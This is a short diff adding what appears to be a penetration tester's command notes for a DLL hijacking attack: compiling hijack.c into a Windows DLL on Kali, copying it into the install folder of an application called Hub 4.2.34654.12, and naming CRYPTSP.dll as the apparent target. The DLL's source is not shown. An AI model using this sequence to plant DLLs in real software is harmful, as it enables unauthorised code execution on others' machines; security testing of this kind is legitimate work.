@@ -1,0 +1,10 @@
+sudo -i
+cd ~kali
+cd DLL
+vi hijack.c
+x86_64-w64-mingw32-gcc-win32 hijack.c -o hijack.dll -shared
+ls -lasrt
+file hijack.dll
+cp hijack.dll /mnt/mwiles/Dropbox/temp/DLL/hijack.64.dll
+cp c:\temp\hijack.64.dll c:\Hub 4.2.34654.12\
+CRYPTSP.dll
